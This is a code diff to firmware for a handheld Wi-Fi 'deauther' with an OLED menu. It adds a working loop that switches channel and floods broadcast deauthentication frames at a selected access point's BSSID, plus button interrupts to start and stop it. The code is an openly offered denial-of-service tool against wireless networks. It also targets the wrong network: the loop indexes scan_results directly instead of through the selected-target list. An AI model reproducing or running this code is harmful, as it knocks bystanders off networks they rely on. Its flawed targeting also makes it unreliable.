@@ -3,6 +3,7 @@
 #undef max
 
 #include "util.h"
+#include "pin.h"
 #include "struct.h"
 #include "deauther.h"
 #include "icon.h"
@@ -36,7 +37,7 @@ extern bool isPageLoaded;
 // deauthenticate scanning
 bool isDeauthenticating = false;
 bool isChangingSSID = false;
-uint8_t activeSSID = 0;
+uint8_t activeSSIDIndex = 0;
 uint8_t networkCount = 0;
 uint8_t activeInput = 0;
 
@@ -45,6 +46,9 @@ uint8_t activeInput = 0;
 char *buttonsString = "De-Authenticate";
 
 std::vector<WiFiScanResult> scan_results;
+std::vector<int> deauth_wifis;
+uint8_t deauth_bssid[6];
+uint16_t deauth_reason = 2;
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
@@ -84,11 +88,11 @@ void showScanResult() {
   display.clearDisplay();
   displayFrame();
   showScreenTitle("DE-AUTHENTICATE");
-  String ssid = formatSSID(scan_results[activeSSID].ssid);
+  String ssid = formatSSID(scan_results[activeSSIDIndex].ssid);
   drawInputBox(0, 40, (String(ssid)).c_str(), activeInput == 0);
   display.setCursor(5, 65);
   display.setTextColor(SH110X_WHITE);
-  display.print("[" + scan_results[activeSSID].bssid_str + "]");
+  display.print("[" + scan_results[activeSSIDIndex].bssid_str + "]");
   drawButton(15, 92, 100, buttonsString, activeInput == 1);
 }
 
@@ -102,8 +106,36 @@ void showDeautherScreen() {
 
 void startDeauther() {
   if (isDeauthenticating) {
-    Serial.println("Deauthenticating");
+    uint32_t current_num = 0;
+    while (deauth_wifis.size() > 0 && isDeauthenticating) {
+      memcpy(deauth_bssid, scan_results[current_num].bssid, 6);
+      wext_set_channel(WLAN0_NAME, scan_results[current_num].channel);
+      current_num++;
+      if (current_num >= deauth_wifis.size()) current_num = 0;
+
+      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+        delay(5);
+      }
+      delay(50);
+    }
   }
+}
+
+void handleSELButtonInterrupt() {
+  if (isDeauthenticating) {
+    isDeauthenticating = false;
+    buttonsString = "De-Authenticate";
+    activeInput = 1;
+  }
+  isPageLoaded = false;
+}
+
+void handleBACKButtonInterrupt() {
+  isDeauthenticating = false;
+  isMainMenu = true;
+  selectedMenu = -1;
+  isPageLoaded = false;
 }
 
 void deautherSetup() {
@@ -114,6 +146,8 @@ void deautherSetup() {
     isPageLoaded = true;
     showDeautherScreen();
   }
+  attachInterrupt(digitalPinToInterrupt(BTN_SEL_PIN), handleSELButtonInterrupt, CHANGE);
+  attachInterrupt(digitalPinToInterrupt(BTN_BACK_PIN), handleBACKButtonInterrupt, CHANGE);
 
   display.display();
 }
@@ -121,9 +155,9 @@ void deautherSetup() {
 void deautherLoop() {
   if (BTN_NEXT.isReleased()) {
     if (isChangingSSID) {
-      activeSSID += 1;
-      if (activeSSID >= networkCount) {
-        activeSSID = networkCount - 1;
+      activeSSIDIndex += 1;
+      if (activeSSIDIndex >= networkCount) {
+        activeSSIDIndex = networkCount - 1;
       }
     } else {
       if (activeInput < 1) {
@@ -137,10 +171,10 @@ void deautherLoop() {
 
   if (BTN_PREV.isReleased()) {
     if (isChangingSSID) {
-      if (activeSSID > 0) {
-        activeSSID -= 1;
+      if (activeSSIDIndex > 0) {
+        activeSSIDIndex -= 1;
       } else {
-        activeSSID = 0;
+        activeSSIDIndex = 0;
       }
     } else {
       if (activeInput > 0) {
@@ -160,6 +194,10 @@ void deautherLoop() {
         isChangingSSID = true;
       }
     } else {
+      //clear current deauther lít
+      deauth_wifis.clear();
+      deauth_wifis.push_back(activeSSIDIndex);
+
       if (!isDeauthenticating) {
         buttonsString = "Stop";
         isDeauthenticating = true;
